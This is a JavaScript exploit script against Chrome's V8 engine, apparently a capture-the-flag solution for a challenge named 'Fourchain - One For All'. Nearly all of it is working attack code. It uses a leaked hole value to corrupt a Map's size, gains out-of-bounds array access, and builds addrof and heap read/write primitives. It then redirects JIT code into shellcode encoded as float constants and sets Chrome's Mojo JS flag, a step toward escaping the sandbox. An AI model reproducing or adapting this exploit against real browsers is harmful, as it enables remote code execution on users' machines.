ab = new ArrayBuffer(8);
f64 = new Float64Array(ab);
B64 = new BigInt64Array(ab);

function ftoi(f) {
    f64[0] = f;
    return B64[0];
}

function itof(i) {
    B64[0] = i;
    return f64[0];
}
function trigger() {
    let a = [1, 2, 3];
    return a.hole();
}

function foo() {
    // Arbitrary write ( traverse foo.bar, get the heap & the chrome address and write 0x1 to blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_ )
    return [
            1.0, 
            1.971182896537854e-246,
            1.9711824873691482e-246,
            1.9711828966039986e-246,
            1.9711828996966502e-246,
            1.9713036086427644e-246,
            1.971182314009433e-246,
            1.9711823524209352e-246,
            1.9711828965422596e-246,
            1.9710400013656955e-246,
            1.971183204063025e-246,
            1.9710406524285364e-246,
            1.9711832033970258e-246,
            1.971182897998491e-246,
            -6.828527039272794e-229
    ];
}

function pwn_v8() {
    for (let i = 0; i < 0x10000; i++) {
        foo();foo();foo();foo();
    }

    let hole = trigger();
    var map = new Map();
    map.set(1, 1);
    map.set(hole, 1);
    map.delete(hole);
    map.delete(hole);
    map.delete(1);
    print(map.size); // map.size == -1
    oob_arr = [1.1, 1.1, 1.1, 1.1];
    victim_arr = [2.2, 2.2, 2.2, 2.2];
    obj_arr = [{}, {}, {}, {}];
    map.set(50, -1);
    map.set(0x101, 0);
    print(oob_arr.length); // now oob_arr.length = 0x101
    
    data = ftoi(oob_arr[20]);
    ori_victim_arr_elem = (data & 0xffffffff00000000n) >> 32n;
    element_kind = data & 0xffffffffn;
    
    function addrof(o) {
        oob_arr[20] = itof( (ori_victim_arr_elem << 32n) | element_kind );
        oob_arr[31] = itof( (ori_victim_arr_elem << 32n) | element_kind );
        obj_arr[0] = o;
        return ftoi(victim_arr[0]) & 0xffffffffn;
    }
    
    function heap_read64(addr) {
        oob_arr[20] = itof( ((addr-0x8n) << 32n) | element_kind );
        return ftoi(victim_arr[0]);
    }
    
    function heap_write64(addr, val) {
        oob_arr[20] = itof( ((addr-0x8n) << 32n) | element_kind );
        victim_arr[0] = itof(val);
    }
    
    foo_addr = addrof(foo);
    code_addr = heap_read64(foo_addr + 0x18n) & 0xffffffffn;
    jit_addr = heap_read64(code_addr + 0xcn);

    heap_write64(code_addr + 0xcn, jit_addr + 0x82n); // Offset based on the Vagrant VM in Fourchain - One For All 
    heap = heap_read64(addrof(ab) + 0x28n); // the heap in the ArrayBuffer that contains chrome address
    foo.bar = heap;

    foo(); // trigger shellcode execution
    window.location.reload();
}
